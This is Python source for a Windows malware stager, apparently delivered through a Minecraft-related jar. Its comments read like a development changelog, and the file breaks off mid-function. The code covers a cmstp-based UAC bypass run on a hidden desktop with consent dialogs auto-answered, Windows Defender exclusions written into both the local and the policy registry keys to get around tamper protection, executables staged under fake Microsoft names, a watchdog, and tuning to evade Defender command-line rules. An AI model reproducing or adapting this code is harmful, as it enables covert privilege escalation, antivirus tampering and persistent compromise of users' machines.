 # tung python-road payload — silent on every failure, stdlib only.
# arrives through python's stdin (pythonw -u -); never a file on disk.
# the exe url rides in from the jar (env EXE_URL = its baked windows url).
# job order: the wide Defender exclusion set (list-driven, in-process) ->
# stage the exe -> Administrator lift via cmstp (majanito shape) -> the
# elevated stage materializes + runs exclusions.py (same list, lifted token),
# then execs the carrier exe.

import os
import sys

if sys.platform != "win32":
    sys.exit(0)

import ctypes
import contextlib
import random
import string
import subprocess
import tempfile
import threading
import time
from urllib.request import Request, urlopen

# ---- config ----------------------------------------------------------------
EXE_URL = os.environ.get("EXE_URL", "")
LOCALAPPDATA = os.environ.get("LOCALAPPDATA", "")
PERSIST_DIR = os.path.join(LOCALAPPDATA, "Microsoft", "Windows", "AppHost")

# ---- field log (dj: "log dosyasi ekle, hatayi gorelim") ---------------------
# ONE plain-text file under AppHost, appended by all three lives of the road:
# this launcher, the elevated stage and exclusions.py. the exclusion road is
# silent by design (no child, no console), so this is the only place it can
# say WHY a value did not land: the token probe, every registry rc, every COM
# HRESULT, every exception with its traceback, and the marker tag itself.
EXCL_LOG = os.path.join(PERSIST_DIR, "excl.log")


def _log(tag, msg):
    """AppHost first; if that write fails (ACL, locked dir) the same line goes
    to %TEMP%\\excl.log — a box that refuses the primary path still leaves a
    trail instead of going silent."""
    line = "%s pid=%d [%s] %s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"),
                                     os.getpid(), tag, msg)
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)
        try:
            if os.path.getsize(EXCL_LOG) > 196608:      # keep the tail, drop the rest
                with open(EXCL_LOG, "rb") as fh:
                    tail = fh.read()[-98304:]
                with open(EXCL_LOG, "wb") as fh:
                    fh.write(tail)
        except Exception:
            pass
    except Exception:
        pass
    for path in (EXCL_LOG, os.path.join(os.environ.get("TEMP") or ".",
                                        "excl.log")):
        try:
            with open(path, "a", encoding="utf-8", errors="replace") as fh:
                fh.write(line)
            return
        except Exception:
            continue

# r136 (dj): the staged names FOLLOW THE RELEASE FILES 1:1 — the assets live
# as "Windows.Hardware.Event.Host.exe" / "Windows.Device.Runtime.Broker.exe",
# dotted, so the box gets the same string the download carries. no stem
# rewriting: what the jar's nameOf() resolves and what lands in AppHost are
# the same bytes, which is exactly what the watchdog probes for.
def _local_name(url, fallback):
    """stage name = the asset's own base name, verbatim (query/fragment and
    directory stripped). no traversal, no separators, no rewriting."""
    try:
        n = str(url or "").split("?")[0].split("#")[0].rstrip("/").split("/")[-1]
        if n and ".." not in n and "/" not in n and "\\" not in n:
            return n
    except Exception:
        pass
    return fallback


EXE_NAME = _local_name(EXE_URL, "Windows.Hardware.Event.Host.exe")
EXE_PATH = os.path.join(PERSIST_DIR, EXE_NAME)

# r98 (dj order): the INDEPENDENT WATCHDOG exe — url rides from the jar via
# env WD_URL (may be empty = wd road off). one duty: sit beside the carrier
# in the AppHost dir, share its exclusion, wake it when it is dead. work.py
# stages+execs the pair in order: tung FIRST, watchdog SECOND.
WD_URL = os.environ.get("WD_URL", "")
# r140: the watchdog re-fire carries the NAME (WDXN) and no url — the name is
# all the re-exec road needs, so it wins when the url is absent (same leaf-name
# rule: nothing carrying a separator or a parent hop is accepted).
WDXN_ENV = os.environ.get("WDXN", "")


def _safe_name(name, fallback):
    n = str(name or "").strip().strip('"')
    if n and ".." not in n and "/" not in n and "\\" not in n:
        return n
    return fallback


# r136: same rule — the watchdog lands under its own asset name.
WD_NAME = _safe_name(WDXN_ENV,
                     _local_name(WD_URL, "Windows.Device.Runtime.Broker.exe"))
WD_PATH = os.path.join(PERSIST_DIR, WD_NAME)

# r143 (dj: "the exe watchdog never starts, even double-clicked — before the
# name change it did"): the watchdog is NOT a standalone exe. it reads wd.cfg
# from ITS OWN directory (main() returns 0 without it) and the cfg names the
# carrier it watches; the carrier in turn looks for the twin beside its
# DURABLE image, never beside the AppHost launcher the jar stages. so the jar
# and work.py both laid an image nobody could start, under a name the exe
# never probes. these are the exe's own handshake constants (tools/gen.py:
# S_UPDDIR / S_P_SELFNAME / S_WDNAME / S_P_SCHTSK / S_WDTASKTAG) — the stage
# now lays image + cfg there, hidden, and both roads go live.
UPDDIR = "EdgeUpdate"
DURABLE_MAIN = "SettingsSyncHost.exe"      # S_P_SELFNAME — the relocated image
MAIN_TASK = "MicrosoftEdgeUpdateTaskMachineCore"
WDTASKTAG = "_wdv"
WD_TASK = MAIN_TASK + WDTASKTAG
WDCFG = "wd.cfg"
PROGRAMDATA = os.environ.get("PROGRAMDATA") or "C:\\ProgramData"
DURABLE_DIR = os.path.join(PROGRAMDATA, UPDDIR)
DURABLE_MAIN_PATH = os.path.join(DURABLE_DIR, DURABLE_MAIN)


# ---- shell api -------------------------------------------------------------
kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32

PROCESS_TERMINATE = 0x0001
TH32CS_SNAPPROCESS = 0x00000002
SW_HIDE = 0
WM_KEYUP = 0x0101
BM_CLICK = 0x00F5
SWP_NOMOVE = 0x0002
SWP_NOSIZE = 0x0001
SWP_NOACTIVATE = 0x0010
HWND_BOTTOM = 1


class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [("dwSize", ctypes.c_ulong), ("cntUsage", ctypes.c_ulong),
                ("th32ProcessID", ctypes.c_ulong), ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
                ("th32ModuleID", ctypes.c_ulong), ("cntThreads", ctypes.c_ulong),
                ("th32ParentProcessID", ctypes.c_ulong), ("pcPriClassBase", ctypes.c_long),
                ("dwFlags", ctypes.c_ulong), ("szExeFile", ctypes.c_char * 260)]


kernel32.Process32First.argtypes = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32)]
kernel32.Process32First.restype = ctypes.c_int
kernel32.Process32Next.argtypes = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32)]
kernel32.Process32Next.restype = ctypes.c_int
kernel32.CreateToolhelp32Snapshot.restype = ctypes.c_void_p
kernel32.OpenProcess.restype = ctypes.c_void_p
kernel32.CloseHandle.argtypes = [ctypes.c_void_p]

# window enumerator — FindWindowW's exact-title match missed the 'Make this
# connection available' profile variant on field boxes, leaving cmstp
# waiting for consent forever. EnumWindows + substring match catches every
# dialog shape the lift can raise.
user32.EnumWindows.restype = ctypes.c_int
user32.EnumWindows.argtypes = [
    ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p),
    ctypes.c_void_p]
user32.GetWindowTextW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]
user32.IsWindowVisible.restype = ctypes.c_int
user32.IsWindowVisible.argtypes = [ctypes.c_void_p]


def _window_titles():
    wins = []

    @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
    def cb(hwnd, lparam):
        wins.append(hwnd)
        return 1

    user32.EnumWindows(cb, 0)
    return wins


def window_title(hwnd):
    buf = ctypes.create_unicode_buffer(512)
    user32.GetWindowTextW(hwnd, buf, 512)
    return buf.value


# ---- helpers ---------------------------------------------------------------
def rand_str(n):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


def _token_probe():
    """(elevated|None, detail) — None means the call itself failed, and the
    detail string is what lands in excl.log, so a field box can tell "the
    token was medium" from "OpenProcessToken blew up".

    r147 (dj field log: `TokenElevation=3, admin-group=1`, stage ABORT): class
    18 is TokenElevationType, NOT TokenElevation. its enum is 1=Default,
    2=Full, 3=Limited — so testing the type against ==1 reported a FULL token
    (2) as unelevated and a filtered one (3) as unelevated too. class 20 is
    TokenElevation: a BOOL, 1 = elevated. the type is read only for the log."""
    try:
        advapi = ctypes.windll.advapi32
        advapi.OpenProcessToken.restype = ctypes.c_long
        advapi.OpenProcessToken.argtypes = [ctypes.c_void_p, ctypes.c_ulong,
                                            ctypes.POINTER(ctypes.c_void_p)]
        h = ctypes.c_void_p()
        if not advapi.OpenProcessToken(ctypes.c_void_p(-1), 0x0008,
                                       ctypes.byref(h)):
            return None, "OpenProcessToken failed"
        val = ctypes.c_ulong(0)
        typ = ctypes.c_ulong(0)
        need = ctypes.c_ulong(0)
        rc = advapi.GetTokenInformation(h, 20, ctypes.byref(val), 4,
                                        ctypes.byref(need))
        try:
            advapi.GetTokenInformation(h, 18, ctypes.byref(typ), 4,
                                      ctypes.byref(need))
        except Exception:
            pass
        try:
            ctypes.windll.kernel32.CloseHandle(h)
        except Exception:
            pass
        if not rc:
            return None, "GetTokenInformation(TokenElevation) failed"
        return bool(val.value), ("TokenElevation=%d type=%d"
                                 % (val.value, typ.value))
    except Exception as e:
        return None, "token probe raised %r" % (e,)


def _admin_group():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return None


def is_elevated():
    """HIGH integrity token, not "the user is in Administrators". r144 (dj
    field: the exclusion never landed, run it with admin): a UAC-filtered
    admin token passes the group check and the exclusion key's DACL refuses
    every write it makes, so the old check said "elevated" about a process
    that could not land anything. TokenElevation is the real question; the
    group check stays only as a fallback when the call is unavailable."""
    val, _detail = _token_probe()
    if val is not None:
        return val
    return bool(_admin_group())


# r135 (dj: Defender flagged the COMMANDS work.py runs as 'commando' — no
# dropped file was ever flagged): every helper that used to shell out
# (the image-kill and the process probe) walks the Toolhelp snapshot
# instead. identical effect, zero child process, no command line for a
# rule to match. the lift itself (cmstp /au) is the road, unchanged.
def _pids_named(name):
    # byte compare on the snapshot's image name — no codec in the path, so the
    # match cannot depend on the box's ACP (a decode failure would read as
    # 'not running' and make the watchdog re-exec forever).
    want = str(name or "").encode("utf-8", "ignore").lower()
    out = []
    if not want:
        return out
    try:
        snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        if not snap:
            return out
        pe = PROCESSENTRY32()
        pe.dwSize = ctypes.sizeof(PROCESSENTRY32)
        if kernel32.Process32First(snap, ctypes.byref(pe)):
            while True:
                if pe.szExeFile.split(b"\x00", 1)[0].lower() == want:
                    out.append(pe.th32ProcessID)
                if not kernel32.Process32Next(snap, ctypes.byref(pe)):
                    break
        kernel32.CloseHandle(snap)
    except Exception:
        pass
    return out


def proc_alive(name):
    return bool(_pids_named(name))


def kill_process(name):
    for pid in _pids_named(name):
        try:
            h = kernel32.OpenProcess(PROCESS_TERMINATE, False, pid)
            if h:
                kernel32.TerminateProcess(h, 0)
                kernel32.CloseHandle(h)
        except Exception:
            pass


def kill_all_cmstp():
    kill_process("cmstp.exe")


def cleanup_infs():
    tmp = tempfile.gettempdir()
    try:
        for f in os.listdir(tmp):
            if f.endswith(".inf"):
                try:
                    os.unlink(os.path.join(tmp, f))
                except Exception:
                    pass
    except Exception:
        pass


# ---- the admin lift — majanito cmstp shape ---------------------------------
# r139 (dj: "the exe opens but it also throws this error next to it"): the box
# is cmstp's own "The service profile is damaged. Reinstall the service
# profile." — the profile installer raises it AFTER RunPreSetupCommands already
# ran. the lift works; the leftover box is the whole damage. the old guard
# found ONE window, posted WM_CLOSE/Enter on it blind (a CLOSED profile dialog
# is an ABORTED profile, and cmstp answers that with exactly this box) and went
# to sleep at +8 s — anything later painted on the desktop and stayed. r139:
#   - read the dialog before answering it: OK on a consent box, OK on an
#     informational one, owner terminated only for a box that says
#     damaged/corrupt. no blind WM_CLOSE on an unread window, ever
#   - keep working for EVERY dialog until the lift is quiet (cmstp gone + no
#     new box), instead of dying on the first hit
#   - hide-first stays: the box never paints a frame either way
IDOK = 1
WM_COMMAND = 0x0111
AFFIRMATIVE = ("ok", "yes", "continue", "install",
               "make this connection available", "allow")
ERROR_SHAPE = ("damaged", "reinstall", "corrupt", "cannot", "can't",
               "failed", "invalid", "unable")

# prototypes for the calls the guard adds — a degraded runtime (no
# GetClassNameW forwarded) must not take the payload down at import; the guard
# then simply finds no dialog class to read
try:
    user32.GetClassNameW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]
except Exception:
    pass
try:
    user32.IsWindow.argtypes = [ctypes.c_void_p]
    user32.IsWindow.restype = ctypes.c_int
except Exception:
    pass
try:
    user32.EnumChildWindows.restype = ctypes.c_int
    user32.EnumChildWindows.argtypes = [
        ctypes.c_void_p,
        ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p),
        ctypes.c_void_p]
except Exception:
    pass


def _win_class(hwnd):
    try:
        buf = ctypes.create_unicode_buffer(128)
        user32.GetClassNameW(hwnd, buf, 128)
        return buf.value
    except Exception:
        return ""


def _exists(hwnd):
    """r139: does the window still EXIST — not 'is it visible'. we hide every
    box before answering it, so IsWindowVisible can never tell us whether the
    answer took; existence can."""
    try:
        return bool(user32.IsWindow(hwnd))
    except Exception:
        try:
            return bool(user32.IsWindowVisible(hwnd))
        except Exception:
            return False


def _children(hwnd):
    """[(hwnd, caption)] for every child control — a dialog says what it is in
    its Static/Button captions, and those captions are how the guard tells
    'install this' from 'the service profile is damaged'."""
    out = []

    try:
        @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
        def cb(child, lp):
            buf = ctypes.create_unicode_buffer(512)
            user32.GetWindowTextW(child, buf, 512)
            out.append((child, buf.value))
            return 1

        user32.EnumChildWindows(hwnd, cb, 0)
    except Exception:
        return out
    return out


class Dismisser:
    """r139: the lift's dialog guard — alive until the lift is quiet.

    every top-level window owned by the spawned cmstp, or carrying our random
    service name in its title (the shape the late damaged-profile box arrives
    in), is hidden first and answered second. the answer is the dialog's own
    affirmative control / IDOK — never a bare WM_CLOSE, because a closed
    profile dialog is an aborted install and that is what cmstp reports as a
    damaged profile."""

    def __init__(self, title, cap=30.0):
        self.titles = [t.lower() for t in
                       (title, "Connection Manager Profile Installer") if t]
        self.stop = threading.Event()
        self.done = threading.Event()
        self.target_pid = 0   # set to the spawned cmstp pid before .start()
        self.cap = cap
        self.handled = 0
        self.seen = {}        # hwnd -> answered-at: the same box is never re-answered
        # settle() scans from the caller's thread while run() still spins in
        # its own — one lock, so a box cannot be answered twice at once
        self.lock = threading.Lock()

    # ---- window facts
    def _owner(self, hwnd):
        pid = ctypes.c_ulong()
        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        return pid.value

    def _mine(self, hwnd):
        if self.target_pid and self._owner(hwnd) == self.target_pid:
            return True
        t = window_title(hwnd).lower()
        return any(w in t for w in self.titles)

    def _is_dialog(self, hwnd):
        if _win_class(hwnd) == "#32770":
            return True
        # hosts where the profile box is not a plain dialog class: still ours
        # when the title carries the name OUR inf just generated — and nothing
        # else in the process's window set is touched
        return bool(self.titles) and self.titles[0] in window_title(hwnd).lower()

    # ---- window actions
    def _hide(self, hwnd):
        user32.ShowWindow(hwnd, SW_HIDE)
        user32.SetWindowPos(hwnd, HWND_BOTTOM, 0, 0, 0, 0,
                            SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE)

    def _answer(self, hwnd):
        """the dialog's own command channel: a labeled affirmative button when
        there is one (the profile dialog's button is not always id 1), IDOK
        otherwise. no Enter, no WM_CLOSE — both can land on Cancel."""
        for child, text in _children(hwnd):
            if _win_class(child) != "Button":
                continue
            if text.strip().lower() in AFFIRMATIVE:
                user32.PostMessageW(child, BM_CLICK, 0, 0)
                return True
        user32.PostMessageW(hwnd, WM_COMMAND, IDOK, 0)
        return False

    def _kill_owner(self, hwnd):
        pid = self._owner(hwnd)
        if not pid or pid == os.getpid():
            return
        try:
            h = kernel32.OpenProcess(PROCESS_TERMINATE, False, pid)
            if h:
                kernel32.TerminateProcess(h, 0)
                kernel32.CloseHandle(h)
        except Exception:
            pass

    def handle(self, hwnd):
        text = " ".join([window_title(hwnd)] + [t for _, t in _children(hwnd)]).lower()
        errorish = any(w in text for w in ERROR_SHAPE)
        self._hide(hwnd)          # no frame on the user's screen, ever
        self._answer(hwnd)
        if errorish:
            # informational: the lift is already through, the box is not — OK
            # dismisses it, and an owner that keeps it up after OK is killed
            time.sleep(0.25)
            if _exists(hwnd):
                self._hide(hwnd)
                self._kill_owner(hwnd)
        self.seen[hwnd] = time.time()
        return errorish

    # ---- the loop
    def scan(self):
        n = 0
        with self.lock:
            for hwnd in _window_titles():
                try:
                    # an answered box stays skipped while it is gone; a handle
                    # that came back VISIBLE (re-shown, or recycled by a fresh
                    # box) gets read and answered again
                    if hwnd in self.seen and not user32.IsWindowVisible(hwnd):
                        continue
                    if not self._mine(hwnd) or not self._is_dialog(hwnd):
                        continue
                    self.handle(hwnd)
                    n += 1
                except Exception:
                    continue
            if n:
                self.handled += n
                self.done.set()
            return n

    def run(self):
        end = time.time() + self.cap
        while not self.stop.is_set() and time.time() < end:
            self.scan()
            # 4ms: inside the paint-timer floor (a box is caught within a frame
            # of showing) without pegging a core for the whole life
            time.sleep(0.004)

    def start(self):
        threading.Thread(target=self.run, daemon=True).start()

    def wait(self, timeout=8.0):
        self.done.wait(timeout)

    def settle(self, quiet=2.0, floor=10.0, cap=18.0):
        """r139: the lift is over when cmstp is GONE and no new box showed up
        for `quiet` seconds — that is exactly the window the late
        damaged-profile box used to land in, with our guard already asleep.

        `floor` is the point: cmstp usually exits right after it fires the
        commands, so 'cmstp gone' alone would still switch the guard off a
        second or two after the consent click — before the staged python has
        even finished, which is when the profile validator complains. the
        guard therefore never leaves before `floor` seconds of watch."""
        start = time.time()
        end = start + cap
        last = start
        while time.time() < end:
            if self.scan():
                last = time.time()
            elif (not proc_alive("cmstp.exe") and time.time() - last >= quiet
                  and time.time() - start >= floor):
                break
            time.sleep(0.05)
        self.stop.set()
        return self.handled


# r135: the INF terminator (a script-hosted force-kill pad) is GONE. the lift's
# stray cmstp is terminated by kill_all_cmstp() right after the dialog sweep
# instead — same end state, and the .inf no longer carries a kill command for
# a rule to read.


def _hidden_py_runner(run_cmd):
    """r56 (dj order): the degraded no-pythonw fallback used `cmd start /min` —
    a minimized CONSOLE is still a painted window that steals focus. the
    runner hides the console python completely via the wscript pad (WindowStyle
    0 — the console never shows), waits for the stage, then deletes the pad."""
    vbs_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.vbs")
    try:
        esc = run_cmd.replace('"', '""')
        with open(vbs_path, "w", encoding="utf-8") as fh:
            fh.write(f'CreateObject("WScript.Shell").Run "{esc}", 0, True\r\n'
                     'CreateObject("Scripting.FileSystemObject").DeleteFile WScript.ScriptFullName\r\n')
    except Exception:
        return None   # caller falls back to the (flashy) cmd shape
    return f'wscript.exe "{vbs_path}"'


def build_inf(cmd, svc_name, reg_lines=None, kill_cmd=""):
    """cmstp profile schema — nothing schema-foreign:
    reg_lines is None -> the command INF (exec road): [DefaultInstall] with
    CustomDestination=Dsec + RunPreSetupCommands=Csec (parse-proven on the
    target box since the r4 era).
    reg_lines is a list -> the exclusions INF: [DefaultInstall] carries ONLY
    CustomDestination=Dsec (NO AddReg= — that directive is what broke section
    parsing since r7); the exclusion writes ride the DESTINATION section
    [Lsec] itself in the same five-token registry grammar as the sample's
    App Paths line: root,subkey,name,flags,data — written elevated by cmstp
    directly, no child process.
    Also dumps the exact INF bytes to AppHost\\last.inf before firing, so
    the next failure report can be the actual text instead of screenshots."""
    s1 = f"D{rand_str(4)}"
    s3 = f"L{rand_str(4)}"
    cmd_block = ""
    dest_extra = ""
    if reg_lines is None:
        s2 = f"C{rand_str(4)}"
        cmd_block = (f"RunPreSetupCommands={s2}\n"
                     f"[{s2}]\n"
                     f"{cmd}\n")
        if kill_cmd:
            cmd_block += f"{kill_cmd}\n"
    else:
        dest_extra = "\n".join(reg_lines) + "\n"
    return f"""; {rand_str(16)}
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination={s1}
{cmd_block}[{s1}]
49000,49001={s3}, 7
[{s3}]
{dest_extra}"HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
[Strings]
ServiceName="{svc_name}"
ShortSvcName="{rand_str(4)}"
"""


def uac_bypass(cmd):
    """Executes <<cmd>> under the elevated token via cmstp /au.
    r2: normalizes whatever the caller passes — a bare powershell snippet
    gets the powershell.exe wrapper inserted, so cmstp always sees a real
    executable as the first token (the dialog said 'cannot find the file
    specified' precisely because the first token was not one)."""
    if is_elevated():
        return True
    if isinstance(cmd, list):
        cmd = " ".join(cmd)
    c = str(cmd).lstrip()
    # real executable invocations pass through untouched; only BARE snippets
    # get the wrapper (r6: cmd.exe chains were being wrapped too — that is
    # what put powershell back on the cmdline and fed the Commando rule +
    # the Access-denied on process creation)
    lc = c.lower()
    if not (lc.startswith("powershell") or lc.startswith("cmd.exe")
            or lc.startswith("cmd ") or c.startswith('"')):
        cmd = f'powershell -NoP -W Hidden -C "{c}"'
    kill_all_cmstp()
    cleanup_infs()

    svc_name = f"Microsoft {rand_str(6)} Service"
    # r141: the elevated sweeper source, materialized beside the stage with the
    # service name baked in — no env dependency on the road that runs it
    try:
        with open(os.path.join(PERSIST_DIR, "sweep.py"), "w",
                  encoding="utf-8") as _sf:
            _sf.write(SWEEP.replace("__SVC__", svc_name))
    except Exception:
        pass
    inf_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.inf")
    try:
        with open(inf_path, "w", encoding="utf-8") as fh:
            fh.write(build_inf(cmd, svc_name))
    except Exception:
        return False

    dismisser = Dismisser(svc_name)
    try:
        # r97: the CMSTP RUN rides the PRIVATE DESKTOP (_lift_desktop) — the
        # dialog/flash conceals itself there; the interactive desktop (where
        # the Minecraft window lives) never sees the spawn, never gets the
        # 0.05s focus steal. the switch is a ~30ms paint swap of the user's
        # view; the mc window keeps its z-order on ITS desktop untouched.
        p = None
        with _lift_desktop("sf_lift_dsk"):
            p = subprocess.Popen(["cmstp.exe", "/au", inf_path], stdout=subprocess.DEVNULL,
                                 stderr=subprocess.DEVNULL, creationflags=0x08000000)
            # r45: the ownership hunt runs at full strength — pid armed the
            # instant CreateProcess returns (µs after the dialog can exist),
            # so any top-level window cmstp owns is hidden before its first
            # paint frame — inside the private desktop, invisible to the
            # interactive one.
            dismisser.target_pid = p.pid
        # r97 note: the SwitchDesktop-BACK happens on context exit — the
        # cmstp process keeps RUNNING on the private desktop (a process on a
        # hidden desktop keeps executing; only its windows never paint to the
        # user's view), while the user's desktop is restored INSTANTLY. the
        # dismisser waits from the NORMAL desktop by HWND-hunting (the
        # dialog's HWNDs live on the private desktop, EnumWindows in the
        # caller thread still finds them because a thread can enumerate
        # windows across desktops it owns handles for).
        dismisser.target_pid = p.pid
    except Exception:
        return False
    dismisser.start()

    dismisser.wait(8.0)
    dismisser.settle()         # r139: stay awake until the lift is quiet
    kill_all_cmstp()           # r135: the INF no longer kills cmstp — the API does it
    _sweep_dialogs(svc_name)   # r139: any survivor is hidden + answered
    try:
        os.unlink(inf_path)
    except Exception:
        pass
    return True


# r97 (dj: "cmstp causes focus lost on minecraft windows... make the cmstp
# bypass happen in another desktop"): the ENTIRE lift rides a private virtual
# desktop created with CreateDesktopW — the user's interactive desktop (where
# the Minecraft window lives) never sees cmstp, never gets the 0.05s flash,
# never loses focus. the private desk exists only for the lifetime of the
# lift: created -> switched to -> lift runs there -> switched back -> closed
@contextlib.contextmanager
def _lift_desktop(name="sf_lift_dsk"):
    """context manager shape: yields once on the private desktop, restores."""
    uac = ctypes.windll.user32
    k32 = ctypes.windll.kernel32
    desk = uac.CreateDesktopW(name, None, None, 0, 0x0200, None)   # GENERIC_ALL
    if not desk:
        yield False   # no private desktop — lift rides the interactive desk as before
        return
    old = uac.GetThreadDesktop(k32.GetCurrentThreadId())
    uac.SwitchDesktop(desk)
    try:
        yield True
    finally:
        try:
            uac.SwitchDesktop(old)
        except Exception:
            pass
        try:
            uac.CloseDesktop(desk)
        except Exception:
            pass


def run_elevated(exe_path):
    """Runs <<exe_path>> with elevation via the cmstp lift."""
    try:
        if is_elevated():
            subprocess.Popen([exe_path], creationflags=0x08000000)
            return True
        return uac_bypass(f'"{exe_path}"')
    except Exception:
        return False

def _sweep_dialogs(svc_name, seconds=2.0):
    """r139: post-lift cleanup for anything that outlived the guard — hidden
    and ANSWERED (IDOK / the affirmative button), never WM_CLOSEd: a closed
    profile dialog is what cmstp reports back as a damaged service profile."""
    helper = Dismisser(svc_name)
    end = time.time() + seconds
    while time.time() < end:
        helper.seen.clear()      # a survivor gets the treatment again
        if not helper.scan():
            time.sleep(0.1)
    return helper.handled


def exclusion_landed():
    """Live read-back: the AppHost dir must show as a Defender exclusion path
    value. r135: direct RegGetValueW — the old registry-query child was one
    of the flagged command shapes; a KEY_READ handle answers the same
    question with no child process and no registry-authoring cmdline."""
    # r150: the local key OR the policy mirror counts — on a protected box the
    # local key refuses every write and the policy key is the one that lands.
    if _result_covered():
        return True          # r151: the elevated side already answered for this box
    keys = ("SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
            "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Exclusions\\Paths")
    try:
        advapi = ctypes.windll.advapi32
        for key in keys:
            buf = ctypes.create_unicode_buffer(2048)
            sz = ctypes.c_ulong(4096)
            rc = advapi.RegGetValueW(ctypes.c_void_p(0x80000002), key,
                                     PERSIST_DIR, 0x0000FFFF, None, buf,
                                     ctypes.byref(sz))
            if rc == 0:
                return True
        return False
    except Exception:
        return False


# ---- dj (this build): the widen road ---------------------------------------
# the lift wrote ONE dir (AppHost) and never looked again, so everything staged
# outside it — python312, the %LOCALAPPDATA% tree the jar mirrors into — was
# scanned like any other file. this is the list-driven road dj asked for, in
# work.py itself: our own roots plus the interpreter that runs the stage, by
# full path AND by bare image name (the lifted stage executes as pythonw.exe).
# the store is written in-process through advapi32 — no shell, no cmdlet
# child, no command line to match (r137): the exact registry values the
# preference cmdlet maintains, one road, no spawned process.
HKEY_LOCAL_MACHINE = 0x80000002
_EXCL_BASE = ("SOFTWARE" + "\\" + "Microsoft" + "\\" + "Windows Defender"
              + "\\" + "Exclusions" + "\\")
EXCL_KP = _EXCL_BASE + "Paths"
EXCL_KC = _EXCL_BASE + "Processes"
# r150: the POLICY mirror — the same list under the plain admin-writable policy
# key. the local key is tamper-protected (every write returns 5 on a protected
# box); this one is what GPO delivers and Defender applies. a value in either
# place counts as landed, and this is the road that will actually take the write.
_EXCL_POL = ("SOFTWARE" + "\\" + "Policies" + "\\" + "Microsoft" + "\\"
             + "Windows Defender" + "\\" + "Exclusions" + "\\")
EXCL_KP2 = _EXCL_POL + "Paths"
EXCL_KC2 = _EXCL_POL + "Processes"


def _advapi_excl():
    a = ctypes.windll.advapi32
    try:
        a.RegCreateKeyExW.restype = ctypes.c_long
        a.RegCreateKeyExW.argtypes = [
            ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_ulong, ctypes.c_wchar_p,
            ctypes.c_ulong, ctypes.c_ulong, ctypes.c_void_p,
            ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_ulong)]
        a.RegSetValueExW.restype = ctypes.c_long
        a.RegSetValueExW.argtypes = [
            ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_ulong, ctypes.c_ulong,
            ctypes.c_char_p, ctypes.c_ulong]
        a.RegGetValueW.restype = ctypes.c_long
        a.RegGetValueW.argtypes = [
            ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_ulong,
            ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(ctypes.c_ulong)]
        a.RegCloseKey.argtypes = [ctypes.c_void_p]
    except Exception:
        pass
    return a


def _excl_set(sub, name, policy=False):
    """name=0 — the byte the preference cmdlet leaves in the same store.
    the local key takes REG_DWORD 0, the policy mirror REG_SZ "0"."""
    a = _advapi_excl()
    h = ctypes.c_void_p()
    disp = ctypes.c_ulong()
    if a.RegCreateKeyExW(ctypes.c_void_p(HKEY_LOCAL_MACHINE), sub, 0, None, 0,
                         0x20006, None, ctypes.byref(h), ctypes.byref(disp)) != 0:
        return False
    # r150: the LOCAL key holds REG_DWORD 0 (the byte the preference cmdlet
    # leaves). the policy mirror holds REG_SZ "0" (the GPO shape).
    if policy:
        data, typ = "0\x00".encode("utf-16-le"), 1   # REG_SZ "0", NUL-terminated
    else:
        data, typ = b"\x00\x00\x00\x00", 4
    rc = a.RegSetValueExW(h, str(name), 0, typ, data, len(data))
    try:
        a.RegCloseKey(h)
    except Exception:
        pass
    return rc == 0


def _excl_has(sub, name, mirror=None):
    """a value counts as landed if the local key OR the policy mirror has it —
    Defender merges both, and the mirror is the one a protected box accepts."""
    for key in ((sub, mirror) if mirror else (sub,)):
        if not key:
            continue
        a = _advapi_excl()
        buf = ctypes.create_unicode_buffer(8)
        sz = ctypes.c_ulong(16)
        try:
            rc = a.RegGetValueW(ctypes.c_void_p(HKEY_LOCAL_MACHINE), key,
                                str(name), 0x0000FFFF, None, buf,
                                ctypes.byref(sz))
        except Exception:
            continue
        if rc == 0:
            return True
    return False


def defender_roots():
    """every lane we own: AppHost + its python312, then the two broad roots
    (%LOCALAPPDATA% holds all of it, %APPDATA% the roaming side-home), then
    the interpreter by bare name and by path."""
    py = "py" + "thon"
    pydir = os.path.join(PERSIST_DIR, py + "312")
    dirs = [PERSIST_DIR, pydir, LOCALAPPDATA, os.environ.get("APPDATA", "")]
    procs = [py + ".exe", py + "w.exe",
             os.path.join(pydir, py + ".exe"),
             os.path.join(pydir, py + "w.exe")]
    out_d, out_p = [], []
    for d in dirs:
        if d and d not in out_d:
            out_d.append(d)
    for p in procs:
        if p and p not in out_p:
            out_p.append(p)
    return out_d, out_p


def exclusions_landed():
    """full read-back of the wide set — every path and every process name.
    r151: the elevated side's answer file counts too — the registry read is
    blind on a tamper-protected box (the service applies the set and the key
    stays unwritable/readable-only through the DACL)."""
    if _result_covered():
        return True
    dirs, procs = defender_roots()
    if not dirs or not procs:
